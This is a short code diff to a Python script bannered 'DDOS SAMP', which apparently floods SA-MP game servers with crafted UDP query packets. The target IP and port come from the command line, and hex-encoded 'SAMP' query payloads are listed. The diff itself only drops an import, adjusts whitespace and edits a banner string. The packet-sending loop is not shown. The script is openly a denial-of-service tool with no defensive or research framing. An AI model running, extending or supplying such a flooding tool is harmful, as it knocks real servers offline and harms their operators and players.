@@ -2,16 +2,15 @@ import socket
 import struct
 import codecs,sys
 import threading
-import pyfiglet
 import random
 import time
 import os
 
 
-
 ip = sys.argv[1]
 port = sys.argv[2]
 orgip =ip
+
 
 Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
@@ -68,5 +67,5 @@ if __name__ == '__main__':
          print('                DDOS SAMP ')
          print('=========================================================================')
          print('\n\n')
-         print('[+] DDOS L SERVER KAT'.format(orgip))
+         print('[+] DDOS L SERVERI KAT'.format(orgip))
          pass
